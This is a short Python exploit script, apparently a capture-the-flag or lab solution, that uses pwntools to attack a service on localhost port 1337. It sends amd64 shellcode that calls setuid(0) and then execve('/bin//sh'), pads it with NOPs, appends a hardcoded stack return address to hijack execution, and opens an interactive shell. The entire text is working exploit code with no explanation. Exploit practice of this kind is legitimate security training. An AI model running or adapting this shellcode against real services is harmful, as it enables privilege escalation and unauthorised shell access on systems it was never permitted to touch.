#!/usr/bin/env python

from pwn import * 


context.arch = 'amd64'


p = remote('127.0.0.1', 1337)

payload = asm("""
	xor rdi, rdi
    mov rax, 0x69 
    syscall
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	syscall
""")
payload += asm(shellcraft.nop()) * (120 - len(payload)) 
payload += p64(0x7fffffffec70)

p.send(payload)

p.interactive()
